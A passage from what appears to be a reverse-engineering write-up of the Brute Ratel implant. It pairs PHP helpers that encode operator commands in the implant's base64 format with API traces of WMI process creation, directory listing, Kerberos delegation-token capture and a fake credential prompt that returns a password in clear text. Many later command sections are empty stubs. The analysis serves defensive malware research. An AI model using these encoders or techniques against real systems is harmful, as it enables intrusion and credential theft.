[PAR] DWORD* pcchString : 0x000000C9BDE6E1DC
[RET] [0xc9bddce028]
```

<a id="WbemCreateProcess"></a>
# WbemCreateProcess  

```php
// ex: WbemCreateProcess("notepad");
function WbemCreateProcess($CommandLine)
{
	$cmd_id = "\xd3\xb1 $CommandLine";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000E5066DEE90
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+JLzQSPw1Z0jhzxSjJEwSvx9uWzIchtDOBJnzEk50TdOZUguY"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000E5066CD300
[PAR] DWORD   *pcbBinary : 0x000000E50863EAAC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xe50859bea1]
```

**II. Execution**   

```html
[CNT] [356]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeEx> in [combase.dll] 
[RET] [0xe5085b2b12]

[CNT] [357]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeSecurity> in [combase.dll] 
[RET] [0xe5085b2b4d]

[CNT] [358]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CoCreateInstance> in [combase.dll] 
[PAR] REFCLSID  *clsid       : 0x000000E5085B7B90 ({4590F811-1D3A-11D0-891F-00AA004B2E24})
[PAR] LPUNKNOWN pUnkOuter    : 0x0
[PAR] DWORD     dwClsContext : 0x1
[PAR] REFIID    riid         : 0x000000E5085B7C90 (IWbemLocator)
[PAR] LPVOID    *ppv         : 0x000000E50863E958
[RET] [0xe5085b2b76]

[CNT] [359]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemLocator::ConnectServer> in [wbemprox.dll] 
[PAR] BSTR            strNetworkResource : 0x000000E5066CE450
[STR]                 -> "ROOT\CIMV2"
[PAR] BSTR            strUser            : 0x0 (null)
[PAR] BSTR            strPassword        : 0x0 (null)
[PAR] BSTR            strLocale          : 0x0 (null)
[PAR] long            lSecurityFlags     : 0x0
[PAR] BSTR            strAuthority       : 0x0 (null)
[PAR] IWbemContext*   pCtx	             : 0x0
[PAR] IWbemServices** ppNamespace        : 0x000000E50863E960
[RET] [0xe5085b2bd4]

[CNT] [370]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CoSetProxyBlanket> in [combase.dll] 
[PAR] IUnknown*                pProxy           : 0x000000E5066C99B0
[PAR] DWORD                    dwAuthnSvc       : 0xffffffff
[PAR] DWORD                    dwAuthzSvc       : 0xffffffff
[PAR] OLECHAR*                 pServerPrincName : 0x0 (null)
[PAR] DWORD                    dwAuthnLevel     : 0x3
[PAR] DWORD                    dwImpLevel       : 0x3
[PAR] RPC_AUTH_IDENTITY_HANDLE pAuthInfo        : 0x0
[PAR] DWORD                    dwCapabilities   : 0x0
[RET] [0xe5085b2cf0]

[CNT] [371]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemServices::GetObject> in [fastprox.dll] 
[PAR] BSTR               strObjectPath : 0x000000E5066CCFC8
[STR]                    -> "Win32_Process"
[PAR] long               lFlags        : 0x0
[PAR] IWbemContext*      pCtx          : 0x0
[PAR] IWbemClassObject** ppObject      : 0x000000E50863E940
[PAR] IWbemCallResult**  ppCallResult  : 0x0
[RET] [0xe5085b2d25]

[CNT] [372]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemClassObject::GetMethod> in [fastprox.dll] 
[PAR] LPCWSTR wszName                   : 0x000000E5066DC648
[STR]         -> "Create"
[PAR] long               lFlags         : 0x0
[PAR] IWbemClassObject** ppInSignature  : 0x000000E50863E948
[PAR] IWbemClassObject** ppOutSignature : 0x0
[RET] [0xe5085b2d55]

[CNT] [373]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemClassObject::SpawnInstance> in [fastprox.dll] 
[PAR] long               lFlags        : 0x0
[PAR] IWbemClassObject** ppNewInstance : 0x000000E50863E950
[RET] [0xe5085b2d75]

[CNT] [374]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemClassObject::Put> in [fastprox.dll] 
[PAR] LPCWSTR wszName : 0x000000E5066CE7B0
[STR]         -> "CommandLine"
[PAR] long    lFlags  : 0x0
[PAR] VARIANT *pVal   : 0x000000E50863E978
[FLD]         -> bstrVal = "notepad"
[PAR] CIMTYPE Type    : 0x0
[RET] [0xe5085b2da6]

[CNT] [375]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <IWbemServices::ExecMethod> in [fastprox.dll] 
[PAR] BSTR               strObjectPath : 0x000000E5066CCFC8
[STR]                    -> "Win32_Process"
[PAR] BSTR               strMethodName : 0x000000E5066DC648
[STR]                    -> "Create"
[PAR] long               lFlags        : 0x0
[PAR] IWbemContext*      pCtx          : 0x0
[PAR] IWbemClassObject*  pInParams     : 0x000000E50670B780
[PAR] IWbemClassObject** ppOutParams   : 0x000000E50863E970
[PAR] IWbemCallResult**  ppCallResult  : 0x0
[RET] [0xe5085b2dfc]
```

**III. Result**   

```html
[CNT] [384]
[PTP] [0xa84] [0xa28] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000E5066F4720
[STR]        -> "D3B1"
[STR]           "ROOT\CIMV2"
[STR]           "11"
[PAR] DWORD  cbBinary   : 0x24
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000E5066FE100
[PAR] DWORD* pcchString : 0x000000E50863E7FC
[RET] [0xe50859e028]
```

<a id="listdir2"></a>
# listdir2  

List file names in a given directory and retrieves their size and last written time  

```php
//ex: listdir2("C:\\Users\\eglantine\\Desktop\\Samples\\");
function listdir2($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x3e\xf8 toto $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [348]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000068AAF8EFD0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RP3ySMQdPU320Bz4Llkf5WYWUh0litvjId74BCYcK8WJcAzzvJZMdYeYaveZJZPyIokMyoWAdO0xGMeDIYvpPbM4M4APUS2m"
[STR]            "32djm1cfl3KPSnQmK3ZY/0gMJZLas+ZGku14+lOw23zRr8mHQBMor9pcqyU3slWxGV4s0JQxc/hK7WMgrfVvorgn73XrzjlXbtWUnj3+wU7Knn71qqbhTZdD"
[STR]            "ZEg="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000068AAFAACF0
[PAR] DWORD   *pcbBinary : 0x00000068ACFCE5FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x68acf2bea1]
```

**II. Execution**   

```html
[CNT] [372]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <FindFirstFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName : 0x00000068AAF906F0
[STR]         -> "C:\Users\eglantine\Desktop\Samples\*"
[RET] [0x68acf32d92]

[CNT] [382]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <FindNextFileW> in [KERNEL32.DLL] 
[PAR] HANDLE             hFindFile      : 0x00000068AAF901B0
[PAR] LPWIN32_FIND_DATAW lpFindFileData : 0x00000068ACFCE290
[RET] [0x68acf33501]

[CNT] [383]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <CreateFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName            : 0x00000068AAF90210
[STR]         -> "C:\Users\eglantine\Desktop\Samples\\APT10"
[PAR] DWORD   dwDesiredAccess       : 0x80000000 (GENERIC_READ)
[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
[RET] [0x68acf32f14]

[CNT] [384]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <GetFileTime> in [KERNEL32.DLL] 
[PAR] HANDLE     hFile            : 0x2ec
[PAR] LPFILETIME lpCreationTime   : 0x0
[PAR] LPFILETIME lpLastAccessTime : 0x0
[PAR] LPFILETIME lpLastWriteTime  : 0x00000068ACFCE268
[RET] [0x68acf32f3c]

[CNT] [385]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <FileTimeToSystemTime> in [KERNEL32.DLL] 
[RET] [0x68acf32f5d]

[CNT] [386]
[PTP] [0x5f8] [0x988] [c:\windows\system32\rundll32.exe]
[API] <SystemTimeToTzSpecificLocalTime> in [KERNEL32.DLL] 
[RET] [0x68acf32f78]

[...]
```

**III. Result**   

```html
[CNT] [962]
[PTP] [0x9b4] [0x978] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000000945251D10
[STR]        -> "320A"
[STR]           "C:\Users\eglantine\Desktop\Samples\|09-04-2025 02:17|AA|APT10"
[STR]           "09-04-2025 02:17|AA|BRUTERATEL"
[STR]           "09-04-2025 02:17|AA|CRUTCH"
[STR]           "09-04-2025 02:17|AA|google"
[STR]           "09-04-2025 02:17|AA|pebbledash"
[STR]           "09-04-2025 02:17|AA|quiet_canary"
[STR]           "09-04-2025 02:17|AA|redline_stealer"
[STR]           "09-04-2025 02:17|AA|sliver"
[STR]           "09-04-2025 02:17|AA|SOLAR_FLARE"
[STR]           "09-04-2025 02:17|AA|tinyturla"
[PAR] DWORD  cbBinary   : 0x2aa
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000094524F630
[PAR] DWORD* pcchString : 0x00000009472BE74C
[RET] [0x94721e028]
```

<a id="GetDelegationToken"></a>
# GetDelegationToken  

```php
// GetDelegationToken("ldap/MYDC.mylab.local");
function GetDelegationToken($TargetName)
{
	$cmd_id = "\xb9\xe4 $TargetName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x910] [0xa7c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000CA6C578D00
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Ye7ESPwfDBDY1G+FKVh9xn8jB2oJptvNCYPGJSp7J4D0BQXImqZPcZeBV/T2dtuQNJIptA=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000CA6C5853D0
[PAR] DWORD   *pcbBinary : 0x000000CA6E50EA1C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xca6e46bea1]
```

**II. Execution**   

```html
[CNT] [353]
[PTP] [0x910] [0xa7c] [c:\windows\system32\rundll32.exe]
[API] <AcquireCredentialsHandleW> in [SspiCli.dll] 
[PAR] LPWSTR         pszPrincipal     : 0x0 (null)
[PAR] LPWSTR         pszPackage       : 0x000000CA6E48892A
[STR]                -> "Kerberos"
[PAR] unsigned long  fCredentialUse   : 0x2 (SECPKG_CRED_OUTBOUND)
[PAR] void*          pvLogonId        : 0x0
[PAR] void*          pAuthData        : 0x0
[PAR] SEC_GET_KEY_FN pGetKeyFn        : 0x0
[PAR] void*          pvGetKeyArgument : 0x0
[PAR] PCredHandle    phCredential     : 0x000000CA6E50E0D0
[PAR] PTimeStamp     ptsExpiry        : 0x0
[RET] [0xca6e4715dc]

[ * ] [pid 0x910][tid 0xa7c] c:\windows\system32\rundll32.exe
[API] <AcquireCredentialsHandleW>
[RES] SECURITY_STATUS 0x0 (SEC_E_OK)

[CNT] [354]
[PTP] [0x910] [0xa7c] [c:\windows\system32\rundll32.exe]
[API] <InitializeSecurityContextW> in [SspiCli.dll] 
[PAR] PCredHandle    phCredential  : 0x000000CA6E50E0D0
[PAR] PCtxtHandle    phContext     : 0x0
[PAR] WCHAR*         pszTargetName : 0x000000CA6C53B820
[STR]                -> "ldap/MYDC.mylab.local"
[PAR] unsigned long  fContextReq   : 0x103 (ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY)
[PAR] unsigned long  Reserved1     : 0x0
[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
[PAR] PSecBufferDesc pInput        : 0x0
[PAR] unsigned long  Reserved2     : 0x0
[PAR] PCtxtHandle    phNewContext  : 0x000000CA6E50E0E0
[PAR] PSecBufferDesc pOutput       : 0x000000CA6E50E100
[PAR] unsigned long* pfContextAttr : 0x000000CA6E50E0B4
[PAR] PTimeStamp     ptsExpiry     : 0x0
[RET] [0xca6e47166b]

[ * ] [pid 0x910][tid 0xa7c] c:\windows\system32\rundll32.exe
[API] <InitializeSecurityContextW>
[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x1
[FLD]                -> pBuffers  = 0x000000CA6E50E0F0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0xb57
[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
[FLD]                   -> pvBuffer   = 0x000000CA6C571750
[PAR] unsigned long  pfContextAttr : 0x103 (ISC_RET_DELEGATE | ISC_RET_MUTUAL_AUTH | ISC_RET_ALLOCATED_MEMORY)
[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
```

**III. Result**   

```html
[CNT] [369]
[PTP] [0x910] [0xa7c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000CA6C594E30
[STR]        -> "B9E4"
[STR]           "ldap/MYDC.mylab.local 6E820B4230820B3EA003020105A10302010EA20703050020000000A38204B2618204AE308204AAA003020105A10D1B0B4D"
[STR]           "594C41422E4C4F43414CA2233021A003020102A11A30181B046C6461701B104D5944432E6D796C61622E6C6F63616CA382046D30820469A003020112"
[STR]           "A103020103A282045B04820457A186900E0C3848E99A94079A0A1897697CE7FDBC66C5E632A075619457E452FD37F988E2368D141DE86E8309D16B19"
[STR]           "C1E073159814CE94055AD1415BB72F4B0D4C45B61AC442A6F858F3969643A4C58F83341BF587A1641840859EC8F21113D99800E8A9AFDC990E954D32"
[STR]           "738729483F9657B47A8537DDBF7120E8F96108FC802ACCE494CE59E5F518A38CBCF524B74DA059237BC0C2777A1F5705B5980F3D6253AADA1DBCB53D"
[STR]           "90A26076D941EF48909170147CF06AF3EE0EFF409A285C29B9311D009D8F1FD8149A7659D9B13682B1963D4CD41A46A9652D148DC5EF4D8AEC755092"
[STR]           "4B05E52C322FB05D613221BAEC83DC3A4BFD72FB5A4CFB05EB72EEF347E4F6A2BE8B3568D60EC0536D54CE38D5DF59F8103EDDAD1B3B5810B314BCE2"
[STR]           "B0F338DDAA276E5DC20CE745E59E90BAA7E81EAD24607AEB3B7B8C25220250E190DC645A84CB03E4907A8718356791C92E1EC81D1C7B7792C59FA062"
[STR]           "FEC2BFD1139508BFCFA1622C6A53BDD8B1599D202DC45FB45ED09411C2AE239C81E86917D0220564687948E5E9ABE98D1196BE8C7D0B58BCD592F502"
[STR]           "163119145D923EFBFE737EBBF5AC937ACB3EAD8049485290B2E8F8D684BFCB7EDFABADB913640177401F557909309F0070DE3D2252F313DE2B19B959"
[STR]           "F0E4279AB0ADEFBEE5E4CEB84F6211D5DE690F0EF117CA768D5E744D80191A23A8EB0BC9F82D64FF3A080753695D7F7FD986CED38D236F9E88DB2FFC"
[STR]           "EBD367B879235102203EC7D40C3C38313F2DA0BC095F7EB9D3C751D3F57E2DA7650C3DA806E6FE1987DA06F339D92C50BA62645A485A484F31E703C5"
[STR]           "4AB54414C7DF78EA94E0D9855D673B8308F4B3B19E60043E1D28022C7C12E75CC7BA2BE580A71AF4A1D0FE28BE56CB4AE631C705BCD7C38642B42CAF"
[STR]           "C1F5B0376C5159AD051DDAD58E28E9BB03E837AE28488A4C796C086DF8BABAD5A826E30349CE02C9981DFA9239ED7571DBCB2CA29DE9D604102C3E92"
[STR]           "5CD6F06EDE1B9979C17BDC8D3D57A3E6C9E13E8477C3D7F48261EA862BB25CCF1672222B6D07B51C884BC27F91D0E1B3BD8F943BF94D9D5136C0A630"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0x2d94
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000CA6C597BD0
[PAR] DWORD* pcchString : 0x000000CA6E50DFBC
[RET] [0xca6e46e028]
```

<a id="ping"></a>
# ping  

```php
// ex: ping("tiguanin.com");
function ping($host)
{
	$cmd_id = "\x3a\xb9 $host";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000026CC761FA0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W/n+SPofMhbfwBC+H1ob92p8DytHwdzTJtM="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000026CC7709D0
[PAR] DWORD   *pcbBinary : 0x00000026CE72E6CC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x26ce68bea1]
```

**II. Execution**   

```html
[CNT] [403]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <IcmpCreateFile> in [iphlpapi.dll] 
[RET] [0x26ce69078f]

[CNT] [410]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <inet_pton> in [ws2_32.dll] 
[PAR] INT   Family        : 0x2 (AF_INET) (IPv4)
[PAR] PCSTR pszAddrString : 0x00000026CC771360
[STR]       -> "tiguanin.com"
[PAR] PVOID pAddrBuf      : 0x00000026CE72E5EC
[RET] [0x26ce6907c2]

[CNT] [411]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <gethostbyname> in [ws2_32.dll] 
[PAR] PCHAR name : 0x00000026CC771360
[STR]       -> "tiguanin.com"
[RET] [0x26ce6907cf]

[CNT] [412]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <inet_ntoa> in [ws2_32.dll] 
[PAR] struct in_addr in : 0x2e8ffea9
            -> 169.254.143.46
[RET] [0x26ce6907f6]

[CNT] [413]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <IcmpSendEcho> in [iphlpapi.dll] 
[PAR] HANDLE                   IcmpHandle         : 0x00000026CC74E8F0
[PAR] IPAddr                   DestinationAddress : 0x2e8ffea9 (169.254.143.46)
[PAR] LPVOID                   RequestData        : 0x00000026CE72E5EB
[PAR] WORD                     RequestSize        : 0x1
[PAR] PIP_OPTION_INFORMATION   RequestOptions     : 0x0
[PAR] LPVOID                   ReplyBuffer        : 0x00000026CC76FE50
[PAR] DWORD                    ReplySize          : 0x31
[PAR] DWORD                    Timeout            : 0x2710
[RET] [0x26ce69084d]

[CNT] [432]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <IcmpCloseHandle> in [iphlpapi.dll] 
[RET] [0x26ce69095c]
```

**III. Result**   

```html
[CNT] [431]
[PTP] [0xad4] [0xac8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000026CC74EF50
[STR]        -> "3AB9"
[STR]           "AA tiguanin.com 169.254.143.46 64"
[PAR] DWORD  cbBinary   : 0x4e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000026CC7824A0
[PAR] DWORD* pcchString : 0x00000026CE72E51C
[RET] [0x26ce68e028]
```

<a id="GetCredentialsFromUiPrompt"></a>
# GetCredentialsFromUiPrompt  

This cmd rely on a legitimate API "CredUIPromptForWindowsCredentialsW" to ask the user for its credentials and retrieve them unencrypted...  

<p><a href="https://cedricg-mirror.github.io/docs/assets/images/bruteratel/CredsPrompt.jpg">
<img src="/docs/assets/images/bruteratel/CredsPrompt.jpg" alt="Social engineering asking for credentials">
</a></p>

```php
// 10 ex: GetCredentialsFromUiPrompt("Knock, knock, Neo.");
function GetCredentialsFromUiPrompt($CaptionText)
{
	$cmd_id = "\x9c\xda $CaptionText";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0xa78] [0x774] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000098671B2E90
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+esX6SM1qaw7ipSW4N0pb91F8eC0not/rH7mGJg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000098671C10C0
[PAR] DWORD   *pcbBinary : 0x000000986923E79C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x986919bea1]
```

**II. Execution**   

```html
[CNT] [435]
[PTP] [0xa78] [0x720] [c:\windows\system32\rundll32.exe]
[API] <CredUIPromptForWindowsCredentialsW> in [credui.dll] 
[PAR] PCREDUI_INFOW pUiInfo              : 0x00000098697AE960
[FLD]               -> cbSize         = 0x28
[FLD]               -> hwndParent     = 0x0
[FLD]               -> pszMessageText = "Please enter credentials to use:"
[FLD]               -> pszCaptionText = "Knock, knock, Neo."
[FLD]               -> hbmBanner      = 0x0
[PAR] DWORD   dwAuthError          : 0x0
[PAR] ULONG*  pulAuthPackage       : 0x00000098697AE924
[PAR] LPCVOID pvInAuthBuffer       : 0x0
[PAR] ULONG   ulInAuthBufferSize   : 0x0
[PAR] LPVOID* ppvOutAuthBuffer     : 0x00000098697AE950
[PAR] ULONG*  pulOutAuthBufferSize : 0x00000098697AE928
[PAR] BOOL*   pfSave               : 0x00000098697AE920
[PAR] DWORD   dwFlags              : 0x1 (CREDUIWIN_GENERIC)
[RET] [0x98691a6362]

[CNT] [541]
[PTP] [0xa78] [0x720] [c:\windows\system32\rundll32.exe]
[API] <CredUnPackAuthenticationBufferW> in [credui.dll] 
[PAR] DWORD  dwFlags           : 0x0
[PAR] PVOID  pAuthBuffer       : 0x00000098672787A0
[PAR] DWORD  cbAuthBuffer      : 0x54
[PAR] LPWSTR pszUserName       : 0x00000098697AEB90
[PAR] DWORD* pcchMaxUserName   : 0x00000098697AE930
[PAR] LPWSTR pszDomainName     : 0x00000098697AE988
[PAR] DWORD* pcchMaxDomainName : 0x00000098697AE92C
[PAR] LPWSTR pszPassword       : 0x00000098697AED98
[PAR] DWORD* pcchMaxPassword   : 0x00000098697AE934
[RET] [0x98691a6405]

[ * ] [pid 0xa78][tid 0x720] c:\windows\system32\rundll32.exe
[API] <CredUnPackAuthenticationBufferW>
[PAR] LPWSTR pszUserName   : 0x00000098697AEB90
[STR]        -> "Neo"
[PAR] LPWSTR pszDomainName : 0x00000098697AE988
[STR]        -> ""
[PAR] LPWSTR pszPassword   : 0x00000098697AED98
[STR]        -> "WhiteRabbit"
[RES] DWORD 0x1
```

**III. Result**   

```html
[CNT] [554]
[PTP] [0xa78] [0x720] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000098671EBEE0
[STR]        -> "9CDA"
[STR]           "Neo"
[STR]           "WhiteRabbit"
[PAR] DWORD  cbBinary   : 0x2a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000098671F1EF0
[PAR] DWORD* pcchString : 0x00000098697AE83C
[RET] [0x986919e028]
```

<a id="GetThreadsInfo"></a>
# GetThreadsInfo  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="InjectSetContext"></a>
# InjectSetContext  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="connect_localhost_global_struct"></a>
# connect_localhost_global_struct  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="WriteMemory"></a>
# WriteMemory  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetUsersPwdHashes"></a>
# GetUsersPwdHashes  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="CreateProcessConf3"></a>
# CreateProcessConf3  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown_update_global_struct"></a>
# unknown_update_global_struct  

Update an array of base64 encoded data in the malware global state structure  
TODO  


<a id="StopService"></a>
# StopService  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="DelayCmdExec"></a>
# DelayCmdExec  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown_network"></a>
# unknown_network  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```
